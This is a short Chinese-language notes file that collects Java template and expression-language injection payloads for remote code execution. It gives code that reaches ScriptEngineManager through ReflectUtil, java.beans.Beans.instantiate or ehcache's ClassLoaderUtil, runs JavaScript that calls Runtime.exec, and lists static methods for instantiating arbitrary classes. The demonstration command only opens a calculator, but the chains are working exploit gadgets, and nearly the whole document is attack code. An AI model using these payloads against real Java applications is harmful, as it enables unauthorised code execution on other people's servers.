# 收集



javax.el.ELProcessor.eval().getValue()

## 单链执行RCE

```java
Class<?> aClass = ReflectUtil.forName("javax.script.ScriptEngineManager");
ScriptEngineManager o = (ScriptEngineManager)ReflectUtil.newInstance(aClass);
o.getEngineByName("js").eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"open -na Calculator\")");
```



```
//需要依赖
((net.sf.ehcache.util.ClassLoaderUtil::createNewInstance("javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("return 1"))
//原生
#set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\"open -na Calculator\")"))
```



## 可以用的静态方法

```
//初始化任意类
net.sf.ehcache.util.ClassLoaderUtil#createNewInstance(java.lang.String)
org.apache.velocity.util.ClassUtils.getNewInstance
java.beans.Beans.instantiate
```

